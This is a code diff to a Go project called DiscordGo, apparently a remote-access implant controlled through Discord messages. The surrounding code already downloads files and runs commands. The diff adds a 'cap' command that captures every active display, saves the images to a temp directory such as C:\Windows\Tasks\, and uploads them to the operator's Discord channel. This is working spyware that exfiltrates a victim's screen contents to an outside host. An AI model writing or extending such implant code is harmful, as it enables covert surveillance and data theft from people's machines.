@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"image/png"
 	"net"
 	"os"
 	"os/exec"
@@ -17,6 +18,7 @@ import (
 	"DiscordGo/pkg/util"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/kbinani/screenshot"
 )
 
 var newAgent *agent.Agent
@@ -39,6 +41,14 @@ func init() {
 	}
 
 	newAgent.OS = sys
+}
+
+func getTmpDir() string {
+	if runtime.GOOS == "windows" {
+		return "C:\\Windows\\Tasks\\"
+	} else {
+		return "/tmp/"
+	}
 }
 
 func main() {
@@ -200,6 +210,23 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 					util.DownloadFile(fileDownloadPath, message.Attachments[0].URL)
 				} else { // upload http://example.com/test.txt /tmp/test.txt
 					util.DownloadFile(commandBreakdown[2], commandBreakdown[1])
+				}
+			} else if strings.HasPrefix(rest, "cap") {
+				n := screenshot.NumActiveDisplays()
+				for i := 0; i < n; i++ {
+					bounds := screenshot.GetDisplayBounds(i)
+					img, _ := screenshot.CaptureRect(bounds)
+
+					fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
+					file, _ := os.Create(fileName)
+					png.Encode(file, img)
+					defer file.Close()
+
+					f, _ := os.Open(fileName)
+					defer f.Close()
+					fileStruct := &discordgo.File{Name: fileName, Reader: f}
+					fileArray := []*discordgo.File{fileStruct}
+					dg.ChannelMessageSendComplex(message.ChannelID, &discordgo.MessageSend{Files: fileArray})
 				}
 			} else {
 				output := ""
